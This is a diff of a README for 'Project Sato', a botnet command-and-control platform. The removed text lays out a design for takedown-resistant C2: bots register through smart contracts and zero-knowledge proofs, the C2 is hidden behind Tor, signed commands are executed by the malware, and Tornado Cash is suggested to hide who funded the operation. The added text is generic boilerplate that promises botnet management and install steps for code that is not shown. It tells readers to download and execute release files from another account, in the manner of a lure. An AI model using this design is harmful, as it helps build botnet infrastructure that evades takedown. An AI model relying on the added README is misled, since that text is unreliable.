@@ -1,188 +1,124 @@
-# Project Satō - C2 [in-progress, texts may change, diagram may change ..]
+# Project Sato - C2 🚀
 
-This project is wayyy too big for me to do it myself - so i thought to just release this design and possibly get feedback. My main interests in the recent years and build up of knowledge has been in the areas mentioned in this design. I occasionally used ChatGPT to get feedback from and i tried to check and mark sure and only edit the design to what im sure of. Below is the result.
+![Project Sato Logo](https://img.shields.io/badge/Project_Sato-C2-brightgreen)
 
-Project name is Satō, from the anime Ajin. Satō is the antagonist and everytime he dies, he simply stands up again and continues the battle. Similar to how the design behaves - taking down the host/server doesn't guarantee the death of the command and control server.
+Welcome to **Project Sato**, a cutting-edge command-and-control (C2) platform designed with decentralization and censorship resistance in mind. This repository serves as a hub for developers and researchers interested in exploring the intersection of blockchain technology, malware, and advanced cryptographic protocols.
 
-Disclaimer - obviously as there is no code yet, there is not much to say regarding that. However, make sure to use this knowledge in ethical/research purposes only. As my only goal was to continue on the latest academic papers for ethical and research purposes only.
+## Table of Contents
 
-# Project Satō: Roadmap & Beyond
+- [Introduction](#introduction)
+- [Features](#features)
+- [Topics](#topics)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-for defenders to test how today's infrastructure holds up against future cyberattacks. (?)
+## Introduction
 
-## Roadmap
+Project Sato aims to redefine the way we think about command-and-control systems. By leveraging blockchain technology and decentralized protocols, we create a more resilient and secure environment for managing botnets. Our focus on censorship resistance ensures that users can maintain control over their systems without interference.
 
-- Research todays C2 frameworks & models (e.g. Cobalt Strike, Mythic, etc.)
-- Test & build initial components whether it works in practice
-- Experiment with new protocol designs
-- Change Project Satō to similar frameworks/models in the space & Diagram changes
+## Features
 
-# Architecture Diagram 
+- **Decentralized Architecture**: Eliminate single points of failure with a distributed system.
+- **Censorship Resistance**: Maintain functionality even in restrictive environments.
+- **Post-Quantum Cryptography**: Prepare for the future with quantum-resistant algorithms.
+- **Merkle Tree Implementation**: Ensure data integrity and efficient verification.
+- **Smart Contracts**: Automate processes with Solidity-based contracts.
+- **Zero-Knowledge Proofs**: Enhance privacy while proving validity.
+- **Relay Protocols**: Facilitate communication through Tor and other anonymizing networks.
 
-NOTE: The diagram is slightly different than the text - as i improved it from the feedback i got.
+## Topics
 
-![project-sato](https://github.com/user-attachments/assets/87438c8c-24c5-4f8f-89bc-d2b334becc31)
+This project covers a range of topics including:
 
+- Blockchain
+- Botnet
+- C2 (Command and Control)
+- Censorship Resistance
+- Decentralized Systems
+- Malware
+- Merkle Tree
+- Metadata Management
+- Onion Routing
+- Post-Quantum Cryptography
+- Protocol Design
+- Quantum Resistance
+- Relay Systems
+- RISC0
+- Smart Contracts
+- Solidity
+- Tor
+- Tornado Cash
+- Zero-Knowledge Proofs
 
-# Overview
+## Getting Started
 
-The smart contract has only two/three return functions:
-- Snapshot of the merkle tree to save for the client 
-- Insert/update .onion address
-- Insert/update contract address (must be the same logic as application)
+To get started with Project Sato, you will need to set up your development environment. Below are the prerequisites and steps to follow.
 
-Smart contract ZKP functions & helpful code:
-- RISC Zero Rust Starter Template
-    - Risc0-circuits
-    - Risc0-prover
-    - Risc0-types
-- TC Solidity source code
-- Emit events for proof verified only
-- Hyperion (QRL, Solidity based) support
+### Prerequisites
 
-Onion:
-- Transaction Relay source code
-- Communicate with clients & anti-spam/DoS techniques
-- Post-quantum secure communications
-- Zero-knowledge proof verifications
-- Public/private keys for the host and clients
+- A modern operating system (Linux, macOS, or Windows)
+- Node.js and npm
+- Docker (for containerization)
+- Git
 
-Application:
-- Custom malware functions
-- Ethereum, Solana, QRL supported transaction types
-- PoW anti spam / DoS
-- Verify commands from host (and host verifies from client)
-- Listens to contract
+### Installation
 
-Quantum resistance:
-- Smart contract is written in Solidity/Hyperion to make it compatible with EVM - Solana and QRL to make the transition to quantum resistance smooth (if necessary in the future)
-- Bidirectional (post-quantum secure) communication between the host and the clients uses Kyber, Dilithium and AES-256 
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/myedukrishnan/projectsato.git
+   cd projectsato
+   ```
 
-Note: C2 server is behind Tor and hosted with the official opsec recommendations
+2. Install dependencies:
+   ```bash
+   npm install
+   ```
 
-# Flow of the protocol
+3. Build the project:
+   ```bash
+   npm run build
+   ```
 
-## Phase 1 – Your Software (user side)
-- App is available on users device
-- LOCALLY: The app:
-    - Generates a wallet
-    - Has a built-in public key of botnet
-    - Wallet verification: signature = sign("...", walletPrivKey) (to verify they have access to their wallet)
-    - Signs a transaction with the wallet to send via POST request to reach relay and transmit to RPC node:
-        - Instructions of transaction:
-            - For submission: hash(nullifier || pubkey) to contract address
-        - Checklist of instructions transaction within the application:
-            - Does this transaction send to the correct contract address?
-            - Is the submit a hash?
-            - If it is all YES -> Sign!
-- HTTPS (Onion Website):
-    - Sends a POST request to your website with:
-        - {
-        -   "walletAddress": "0x...",
-        -   “publicKeyBotnet”: “0x...”,
-        -   “walletSignature": "0x…”,
-        -   “signedTransaction”: “…”
-        - }
+4. Run the application:
+   ```bash
+   npm start
+   ```
 
-## Phase 2 – Transaction Relay Onion Website (backend)
-- Website receives POST request at Transaction Relay:
-    - Checklist of instructions transaction:
-        - Does this transaction send to the correct contract address?
-        - Is the submit a hash?
-        - Does this transaction not try to drain the wallet?
-        - If it is all YES -> Sign!
-- Send relaySignedTransaction to RPC node.
+## Usage
 
-## Phase 3 - Solidity Smart contract
-- Hash of the Nullifier and Public Key is inserted into the Merkle tree
-- Once the user’s Hash of Nullifier and Public Key is inserted into the Merkle tree, the Merkle tree’s root is calculated, and this becomes a snapshot of the tree at that point in time.
-- This snapshot (the Merkle root) is returned to the user. It essentially represents the entire state of the tree at the time of their registration.
-- The Merkle root is a compact representation of the entire tree, which allows the user to prove they are part of the tree (without needing the entire tree) by submitting the relevant hashes (the proof) in the voting process.
-- IMPORTANT VERIFICATION (POST-REGISTRATION) - Verify proof & access string:
-    - When the user wants to access the string (e.g. onion address), which requires authentication in the contract, they submit a ZKP proving that they are part of the snapshot.
-    - The user has a valid zero-knowledge proof that verifies that they belong to the snapshot.
-    - Once the ZKP is verified, the contract allows the verified user to access the string.
-    - In order to do this, the client needs a listener and the contract needs to emit an event.
+After installation, you can start using Project Sato. The application provides a user-friendly interface to manage your botnet and command-and-control functionalities. Explore the features and see how they can benefit your projects.
 
-## Phase 4 - Post-quantum secure communications between Onion C2 & clients:
-- Kyber, Dilithium, AES-256 encrypted communications
-- The malware has logic that looks for specific conditions or patterns in the server's response in order to be executed
-- Only the host can send commands from x onion address (verified from the smart contract) with:
-- CMD:<command> | SIG: <signature>
-- The signature the bot verifies with the hosts public key before execution
-- When the client connects with their zero-knowledge proof, the server returns a challenge and difficulty
-- Client bruto-forces the correct nonce
-- Client submits the correct nonce
-- For each guess, the client checks:
-    - sha256(challenge + nonce)
-- If success: respond with command/data
-- If failure or too fast: increase difficulty (difficulty *= 2)
-- Cooldown over time: Server resets difficulty to base if enough time passes.
-    - if time_since_last_seen > 60 mins:
-    -     difficulty = BASE_DIFFICULTY
-- Optionally Sliding Dificulty Window, by decaying difficulty gradually:
-    - difficulty = BASE_DIFFICULTY + log2(spam_score)
-    - spam_score -= decay_rate * (now - last_seen)
+## Contributing
 
------------------
-# Advantages & Limitations
-Advantages:
-- Censorship resistance through smart contracts & modular clients
-- Post-quantum secure C2 communications
-- Smart contract adaptability to post-quantum secure smart contract
-- Anonymity for the host/client through Tor & anonymous wallets
-- Taken-down onion address doesn't mean the death of the botnet (onion can be updated to regain connection with the clients)
-- Authentication through censorship resistant zero-knowledge proofs
-- Anti-spam / DoS for the host with PoW challenges (potentially) from the clients
-- Difficult to get to the gas fees or drain gas fees of the host
-- Very difficult/impossible to see the total number of clients
-- Not linkable to registration wallets or actions of the wallet and actions to a specific user.
-- Blockchain metadata privacy (from the zero-knowledge proofs or relay)
-- Additional customization may be done such as obfuscation techniques, etc. as of right now the source code does not provide this by default and there are no plans to add these at all.
+We welcome contributions from the community. To contribute to Project Sato:
 
-Limitations:
-- Tor timing attacks (might reveal the host/you) unless the VPS is not linkable to you. The longer your host is down for whatever reason may expose the host server ip because the adversary can build up a profile or pattern. 
-- Compromised relay might cause fake registrations/clients. Which means the malicious client will always be able to follow you - as in always get an updated onion or contract address.
-- Compromised host can drain your gas fees. This can be mitigated by limiting the amount of gas fees on your account.
-- Contract vulnerabilities (not audited)
-- Deposit(s) of gas fees is linkable back to you - unless Tornado Cash is being used to remove the link for example. 
-- Predictable ways the host/attacker infects computers. If the adversary knows this and if they get their hands on a single client - they gain a lot of information from it (by e.g. reverse engineering, testing the c2, DDosing the c2 (to do a Tor timing attack), etc. An understanding of how your specific malware works in general in order to build out (possible new) attack vectors. 
-- Having millions of clients can raise red flags from the spike in Tor users. 
-- Higher gas fees if the number of clients go higher. Might be mitigated by mining cryptocurrencies in clients. 
-- No mining to fund the gas fees in the current source code.
-  
-# Threat model & OPSEC
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes and commit them (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
 
-There are many ways to skin a cat. This is only one of them. No design covers every use case. Adjust your threat model & opsec where necessary.
+## License
 
-The main question asked in this design is:
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-"How could the host evade censorship, have resilience & metadata privacy, while minimizing gas fees & costs?" 
+## Contact
 
-This is a similar type of questions in the paper: **Leveraging Bitcoin Testnet for Bidirectional Botnet Command and Control Systems.**
+For questions or inquiries, please reach out to the project maintainers. You can find their contact information in the [CONTRIBUTING](CONTRIBUTING.md) file.
 
-How can the blockchain or smart contracts be abused by cybercriminals?
+## Releases
 
-What efforts do we have to call to counter these types of malicious behaviour on the network?
+To download the latest version of Project Sato, visit our [Releases section](https://github.com/myedukrishnan/projectsato/releases). Download the necessary files and execute them to get started.
 
-How can we develop effective detection mechanisms?
+![Download Button](https://img.shields.io/badge/Download_Latest_Version-Here-blue)
 
-Or regulation implications such as:
+Explore the features and capabilities of Project Sato today! For more updates, keep an eye on the [Releases section](https://github.com/myedukrishnan/projectsato/releases).
 
-Will this cause a ban on smart contracts? Or a similar effect as Monero or Tornado Cash?
+---
 
-And many more..
-
-----
-
-# Updates in design (in-progress)
-
-Upcoming protocol design update features (soon):
-- Dont include public key from the user, send signature to relay and with users signature for registration and relays signature (or message), send it to the RPC node. This will make sure the relays public key is only seen by the node.
-- Clients send signatures to the relay, from there they get in a batch (mixed with dummy registrations), then the contract checks whether its real or dummy, slight delay in seconds, and it inserts it into the merkle tree, and then updates the merkle root only once (also saving gas fees)
-
-
--------
-# Credits/inspiration
-- Inspired by https://github.com/jonas089/cipher-poll 
-- Papers mentioning this type of method more in detail - https://arxiv.org/pdf/2006.06036
+This README provides a comprehensive overview of Project Sato. We encourage you to dive in, explore the code, and contribute to the future of decentralized command-and-control systems. Your participation can make a difference!
